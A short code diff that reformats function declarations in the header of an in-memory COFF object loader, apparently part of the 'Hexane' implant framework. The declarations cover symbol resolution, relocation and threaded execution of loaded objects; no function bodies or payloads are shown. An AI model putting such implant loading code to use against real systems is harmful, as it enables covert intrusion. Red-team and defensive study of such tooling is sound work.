@@ -3,16 +3,46 @@
 #include <core/corelib.hpp>
 
 namespace Objects {
-    FUNCTION LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception);
-    FUNCTION VOID WrapperFunction(void *address, void *args, size_t size);
-    FUNCTION BOOL ProcessSymbol(char* sym_string, void** pointer);
-    FUNCTION BOOL ExecuteFunction(_executable* object, char* function, void* args, size_t size);
-    FUNCTION VOID Cleanup(_executable *object);
-    FUNCTION BOOL BaseRelocation(_executable *object);
-    FUNCTION SIZE_T GetFunctionMapSize(_executable *object);
-    FUNCTION VOID RemoveCoff(_executable *object);
-    FUNCTION VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id, bool cache);
-    FUNCTION VOID CoffThread(_coff_params *params);
+    LONG
+    WINAPI
+    FUNCTION
+        ExceptionHandler(PEXCEPTION_POINTERS exception);
+
+    VOID
+    FUNCTION
+        CoffLoader(CHAR *entrypoint, VOID *data, VOID *args, SIZE_T args_size, UINT32 task_id, BOOL cache);
+
+    BOOL
+    FUNCTION
+        ExecuteFunction(EXECUTABLE *object, CHAR *function, VOID *args, SIZE_T size);
+
+    VOID
+    FUNCTION
+        WrapperFunction(VOID *address, VOID *args, SIZE_T size);
+
+    BOOL
+    FUNCTION
+        ProcessSymbol(CHAR *sym_string, VOID **pointer);
+
+    BOOL
+    FUNCTION
+        BaseRelocation(EXECUTABLE *object);
+
+    SIZE_T
+    FUNCTION
+        GetFunctionMapSize(EXECUTABLE *object);
+
+    VOID
+    FUNCTION
+        RemoveCoff(EXECUTABLE *object);
+
+    VOID
+    FUNCTION
+        CoffThread(COFF_PARAMS *params);
+
+    VOID
+    FUNCTION
+        Cleanup(EXECUTABLE *object);
 }
 
 #endif //HEXANE_IMPLANT_OBJECTS_HPP
